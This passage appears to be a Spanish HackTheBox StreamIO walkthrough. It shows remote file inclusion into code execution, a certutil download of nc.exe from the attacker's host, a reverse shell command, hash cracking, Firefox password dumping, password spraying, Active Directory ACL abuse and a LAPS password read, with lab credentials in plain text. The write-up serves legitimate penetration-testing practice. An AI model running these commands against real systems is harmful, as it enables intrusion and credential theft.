SB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d > master.php
```

### Remote File Inclusion (RFI)

Revisando el contenido de "master.php", nos damos cuenta que hay un código PHP.

Este código recibe un archivo por POST. Si el archivo no es index.php, entonces lee su contenido y lo ejecuta. Si intentamos usar index.php, solo muestra un error. Esto permite que, con el archivo adecuado, se pueda ejecutar cualquier código en el servidor, lo cual es peligroso porque permite que cualquiera suba y ejecute código malicioso.

```bash
catnp master.php
```

<figure><img src="../../../../../.gitbook/assets/1146_vmware_JtCpFAedKm.png" alt=""><figcaption></figcaption></figure>

Para comprobar si podemos realizar un RFI (Remote File Inclusion), nos levantaremos un servidor web con python3.

```bash
python3 -m http.server 80
```

<figure><img src="../../../../../.gitbook/assets/1147_vmware_iAKKprgaNb.png" alt=""><figcaption></figcaption></figure>

Capturaremos la solicitud que se tramita por POST con **BurpSuite** y en el "include" que es lo que se espera recibir el código PHP, pondremos nuestro servidor web que estamos alojando.

<figure><img src="../../../../../.gitbook/assets/1149_vmware_CTGhqY0Yf3.png" alt="" width="460"><figcaption></figcaption></figure>

Volviendo a la consola donde hemos levantado el servidor web, comprobamos que se ha recibido una solicitud, por lo tanto, el servidor parece que es vulnerable al RFI.

<figure><img src="../../../../../.gitbook/assets/1150_vmware_dQJsFQZkjC.png" alt=""><figcaption></figcaption></figure>

### RFI + RCE via malicious PHP script

Procederemos a realizar un RFI (Remote File Inclusion) combinado con un RCE (Remote Code Execution) para ejecutar código e intentar ganarnos una Reverse Shell.

Para ello lo primero que haremos es crear un archivo llamado "rce.php" que lo que hará es ejecutar a través de la función **system** el comando **ipconfig** para ver si en la solicitud vemos si es ejecutado también el RCE y logramos poder ejecutar comandos en el servidor.

Levantaremos de nuevo un servidor web con python.

```bash
python3 -m http.server 80

system("ipconfig");
```

<figure><img src="../../../../../.gitbook/assets/1153_vmware_iJs2HOeA3W (1).png" alt="" width="395"><figcaption></figcaption></figure>

Des de **BurpSuite** procederemos a realizar el RFI para que el servidor incluya el contenido de "rce.php", al enviar la solicitud, comprobamos en la respuesta de que se ha ejecutado correctamente el comando "ipconfig".&#x20;

Por lo tanto, comprobamos que tenemos una vía potencial de realizar un RCE para ejecutar comandos en el servidor.

<figure><img src="../../../../../.gitbook/assets/1154_vmware_WBVzSDk8BT.png" alt=""><figcaption></figcaption></figure>

Confirmada la ejecución de comandos. Procederemos a intentar ver si podemos lograr establecernos una Reverse Shell a nuestra Kali.

Para ello, primero nos copiaremos el binario de "nc.exe" en nuestro directorio actual de trabajo.

```bash
locate nc.exe

cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
```

<figure><img src="../../../../../.gitbook/assets/1155_vmware_RYdKCAmT1f.png" alt=""><figcaption></figcaption></figure>

Modificaremos el contenido de "rce.php" y estableceremos que a través de la utilidad de **certutil.exe** nos descargue el archivo "nc.exe" que tendremos nosotros alojados en nuestro servidor web y lo almacene en un directorio que no tengamos problemas de ejecución.&#x20;

Para el tema de los directorios donde podemos guardar el archivo, hemos buscado alguno de [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)

{% code overflow="wrap" %}
```bash
python3 -m http.server 80

system("certutil.exe -f -urlcache -split http://10.10.14.13/nc.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe");
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1156_vmware_uFM3QBobc5.png" alt=""><figcaption></figcaption></figure>

Volveremos a enviar la solicitud para que el RFI actúe y se incluya en el directorio especifiado el binario de nc.exe

<figure><img src="../../../../../.gitbook/assets/1157_vmware_uqqWE1yy2M.png" alt=""><figcaption></figcaption></figure>

A continuación, como ya disponemos de la herramienta de "nc.exe" en la máquina del servidor, lo que realizaremos es modificar el contenido de "rce.php" y indicarle que ejecute una Reverse Shell a nuestra Kali por el puerto 443 que es donde estarmeos escuchando con **nc**.

{% code overflow="wrap" %}
```bash
rlwrap nc -nlvp 443

system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.13 443");
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1158_vmware_8L9Uendldw.png" alt=""><figcaption></figcaption></figure>

Volveremos a tramitar de nuevo otra solicitud con **BurpSuite**

<figure><img src="../../../../../.gitbook/assets/1159_vmware_AWcBApdV9U.png" alt=""><figcaption></figcaption></figure>

## Initial access

Comprobaremos que hemos ganado acceso al equipo a través de un RFI + RCE.

Nos encontramos enla máquina de **streamio.htb** y no disponemos de ningún privilegio especial.

```bash
whoami /priv
```

<figure><img src="../../../../../.gitbook/assets/1160_vmware_DyEoFbAR6D.png" alt=""><figcaption></figcaption></figure>

Probaremos a ver si podmeos acceder al servicio de MSSQL a través de consola a través de **sqlcmd**. Comprobamos que si se encuentra instalado.

<figure><img src="../../../../../.gitbook/assets/1161_vmware_tDKEtTlGPM.png" alt=""><figcaption></figcaption></figure>

### Information Leakage - Database user credentials

Recr

<figure><img src="../../../../../.gitbook/assets/1163_vmware_gqejeXpHBI.png" alt=""><figcaption></figcaption></figure>

### Enumerating the database with sqlcmd

Recordando que disponemos supuestamente la contraseña del usuario "Administrador" para acceder a la MSSQL, esta información la habíamos encontrado en el archivo "index.php".

Probamos de revisar el contenido de la tabla "users" de la BBDD "streamio\_backup" que al principio con SQLI no pudimos obtener los datos, y encontrasmos que hay hashes y usuarios, comparamos con la tabla "users" de la BBDD "streamio" y hay un usuario llamado "nikk37" en esta de "streamio\_backup" que antes no disponíamos.

{% code overflow="wrap" %}
```sql
sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT * FROM users;"

sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio -Q "SELECT * FROM users;"
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1162_vmware_oGOG91m3yp.png" alt="" width="563"><figcaption></figcaption></figure>

### Cracking hashes with JohnTheRipper

Añadiremos este nuevo hash en el archivo "hashes" que disponemos.

<figure><img src="../../../../../.gitbook/assets/1165_vmware_lz2lxqPxOq.png" alt=""><figcaption></figcaption></figure>

Procederemos a intentar crackear el hash con **John**. Finalmente obtenemos la contraseña correcta para ese hash.

```bash
john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
```

<figure><img src="../../../../../.gitbook/assets/1166_vmware_oqejDHkhwY.png" alt=""><figcaption></figcaption></figure>

Nos guardaremos estas nuevas credenciales en el archivo "valid\_credentials.txt"

<figure><img src="../../../../../.gitbook/assets/1168_vmware_DlkrrkCgMq.png" alt=""><figcaption></figcaption></figure>

### Abusing WinRM - EvilWinRM

Debido que tenemos acceso a la terminal de la máquina de STREAMIO, comprobaremos si este usuario es válido a nivel de dominio y de si forma parte del grupo "Remote Managment Users" para así intentar conectarnos al WinRM a través de **evil-winrm**

<figure><img src="../../../../../.gitbook/assets/1164_vmware_xvfu4SRiJj.png" alt=""><figcaption></figcaption></figure>

Probaremos de acceder con las nuevas credenciales encontradas, y comprobamos la flag de **user.txt**

```bash
evil-winrm -i 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
```

<figure><img src="../../../../../.gitbook/assets/1169_vmware_mEcDgkPb87.png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

A continuación, explicaremos lo que hemos realizado para escalar privilegios.

### Enumerating with winPEAS

Primero de todo, procedimos a importar el binario de winPEAS para realizar una enumeración y ver posibles vectores para realizar un PrivEsc.

{% code overflow="wrap" %}
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/winPEASx64.exe

upload /home/kali/Desktop/HackTheBox/Windows/StreamIO/content/winPEASx64.exe
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1171_vmware_6F8YJhGVh0.png" alt=""><figcaption></figcaption></figure>

Comprobamos que ha encontrado lo ha encontrado posibles contraseñas almacenadas de perfiles de Firefox.

<figure><img src="../../../../../.gitbook/assets/1172_vmware_2MN7x6MWOO.png" alt=""><figcaption></figcaption></figure>

### Abusing Firefox Stored Profile Passwords - Firepwd

Procederemos a acceder a esa ruta y descargarnos los archivoss "key4.db" y "logins.json" que son necesarios para obtener las contraseñas en texto claro.

```bash
download key4.db

download logins.json
```

<figure><img src="../../../../../.gitbook/assets/1179_vmware_EZ6Tagi1DG.png" alt=""><figcaption></figcaption></figure>

A través de la herramienta de **firepwd.py** dumpearemos las contraseñas de perfiles de usuarios que se han almacenado en Firefox.

```bash
python /opt/firepwd/firepwd.py -d $(pwd)
```

<figure><img src="../../../../../.gitbook/assets/1180_vmware_YbGjeLkiml.png" alt=""><figcaption></figcaption></figure>

Copiaremos el contenido y procederemos afiltrar para que el output sea más limpio. Nos guardaremos a los usuarios en "users.txt" y sus contraseñas en "passwords.txt".

{% code overflow="wrap" %}
```bash
echo -e "admin,bJDg0dd1s@d0p3cr3@t0r\nnikk37,bn1kk1sd0p3t00:)\nyoshihide,bpaddpadd@12\nJDgodd,bpassword@12" | sed 's/,b/:/g' | awk '{print $1}' FS=":" > users.txt

echo -e "admin,bJDg0dd1s@d0p3cr3@t0r\nnikk37,bn1kk1sd0p3t00:)\nyoshihide,bpaddpadd@12\nJDgodd,bpassword@12" | sed 's/,b/:/g' | awk '{print $2}' FS=":" > passwords.txt

cat *.txt
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1181_vmware_f5RkU8x3NF.png" alt=""><figcaption></figcaption></figure>

Con **netexec** procederemos a realizar una comprobación de los usuarios y contraseñas para que se intenten autenticar al SMB y comprobar si alguna credencial es válida o no.

{% code overflow="wrap" %}
```bash
netexec smb 10.10.11.158 -u users.txt -p passwords.txt --continue-on-success
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Comprobaremos que hemos añadido las nuevas credenciales obtenidas en "credentials.txt".

```bash
catnp credentials.txt
```

<figure><img src="../../../../../.gitbook/assets/1182_vmware_kc7AATeCMH.png" alt=""><figcaption></figcaption></figure>

Como tenemos acceso al WinRM des de otro usuario, comprobaremos si este usuario forma parte del grupo de "Remote Management Users" para así lograr conectarnos con dicho usario, comprobamos que no es miembro del grupo, por lo tanto no podemos conectarnos con ese usuario al WinRM.

<figure><img src="../../../../../.gitbook/assets/1183_vmware_rw7RA8ab0w.png" alt="" width="325"><figcaption></figcaption></figure>

### BloodHound Enumeration

Debido que disponemos de unas credenciales que son válidas a nivel de dominio (nikk37), procederemos a realiar una enumeración con **BloodHound** para buscar vectores y descubrir como pode escalar nuestros privilegios.

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -u nikk37 -p 'get_dem_girls2@yahoo.com' -d streamIO.htb -ns 10.10.11.158
```
{% endcode %}

Marcaremosque el usuario JDgodd se encuentra como "Owned" ya que disponemos de sus credenciales y son válidas.

<figure><img src="../../../../../.gitbook/assets/1184_vmware_dTDtpy0qSh.png" alt="" width="317"><figcaption></figcaption></figure>

Revisando a este usuario, nos fijamos que el usuario tiene permisos de **WriteOwner** sobre el grupo "CORE STAFF". Y además que el grupo "CORE STAFF" tiene permisos de "ReadLAPSPassword" sobre el DC.

<figure><img src="../../../../../.gitbook/assets/1185_vmware_qrXrGHGZhq.png" alt=""><figcaption></figcaption></figure>

Esto lo que significa es que el usuario puede añadir miembros, cambiar el propietario del grupo mencionado, por lo cual si añadimos al usuario a ese grupo tendremos permisos de getLAPSPassword sobre el DC y obtener su contraseña.

<figure><img src="../../../../../.gitbook/assets/1186_vmware_731IAE3TFt.png" alt="" width="443"><figcaption></figcaption></figure>

BloodHound nos da una serie de pautas de como agregarnos al grupo, cambiar propietario, etc.

<figure><img src="../../../../../.gitbook/assets/1187_vmware_VSZmjL4Gnm.png" alt="" width="439"><figcaption></figcaption></figure>

### Abusing WriteOwner privilege over a group - PowerView.ps1

Para poder realiar la explotación, será necesario hacer uso de **PoweView.ps1** debido que sino, no podremos ejecutar los comandos que necesitamos.

Procederemos a pasarnos el PowerView y a import el módulo.

```bash
upload /home/kali/Desktop/HackTheBox/Windows/StreamIO/content/PowerView.ps1

Import-Module .\PowerView.ps1
```

<figure><img src="../../../../../.gitbook/assets/1188_vmware_8azmrK2JPr.png" alt=""><figcaption></figcaption></figure>

### Playing with Add-DomainObjectAcl && Add-DomainGroupMember utilities

Este script convierte una contraseña a un formato seguro, crea un objeto de credenciales para el usuario JDgodd, y luego le otorga permisos y lo agrega al grupo "Core Staff" en Active Directory.

{% code overflow="wrap" %}
```powershell
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('streamIO.htb\JDgodd', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity 'JDgodd'

Add-DomainGroupMember -Identity 'Core staff' -Members 'JDgodd' -Credential $Cred
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1189_vmware_OH7HYnIkvM.png" alt=""><figcaption></figcaption></figure>

Comprobarmeos que se ha añadido correctamente el usuario JDgodd al grupo "CORE STAFF".

```powershell
net user JDgodd
```

<figure><img src="../../../../../.gitbook/assets/1190_vmware_qclM0XUlZm.png" alt="" width="463"><figcaption></figcaption></figure>

### Getting LAPS Passwords - ldapsearch

Haciendo uso de la herramienta de **ldapsearch** y con credenciales que tenemos del usuario que tiene permisos de getLAPSPassword, procederemos a mostrar la contraseña del usuario "Administrator".

{% code overflow="wrap" %}
```bash
ldapsearch -x -H ldap://10.10.11.158 -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' -b 'dc=streamIO,dc=htb' '(objectClass=computer)' ms-MCS-AdmPwd
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Comprobaremos a través de **netexec** de las credenciales para revisar que son válidas, nos conectaremos con **evil-winrm** y obtendremos la flag de **root.txt**.

{% code overflow="wrap" %}
```bash
netexec winrm 10.10.11.158 -u 'Administrator' -p 'o7LGXYb(VEU.nf'

evil-winrm -i 10.10.11.158 -u 'Administrator' -p 'o7LGXYb(VEU.nf'

Get-ChildItem -Path "C:\Users" -Recurse -Filter "root.txt" -ErrorAction SilentlyContinue | Where-Object { $_.Directory -like "*\Desktop" }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
